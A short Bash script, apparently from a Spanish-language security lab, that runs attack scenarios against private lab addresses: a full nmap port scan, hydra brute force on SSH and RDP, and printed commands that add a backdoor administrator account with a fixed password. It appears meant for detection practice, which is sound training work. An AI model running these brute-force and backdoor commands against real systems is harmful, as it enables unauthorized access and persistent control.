#!/usr/bin/env bash
# scripts/escenarios-ataque.sh
# Ejecutar SOLO dentro de kali-attacker, contra las IPs del laboratorio (10.10.10.0/24).
# Requiere pass.txt y pass30.txt ya generados (ver guía, sección Kali).

set -e

echo "== Escenario A: escaneo de puertos (ubuntu-victim) =="
nmap -sS -sV -p- -T4 10.10.10.20

echo "== Escenario B: fuerza bruta SSH (ubuntu-victim) =="
hydra -l labuser -P ~/pass.txt -t 4 ssh://10.10.10.20

echo "== Escenario C: fallos de logon RDP (win-server) =="
hydra -t 1 -l Administrator -P ~/pass30.txt rdp://10.10.10.30

echo "== Escenario D: persistencia simulada =="
echo "Ejecutar manualmente en win-server (PowerShell como administrador):"
echo '  net user labbackdoor "P@ssw0rd-Lab1" /add'
echo '  net localgroup Administrators labbackdoor /add'
echo "Limpiar despues con: net user labbackdoor /delete"
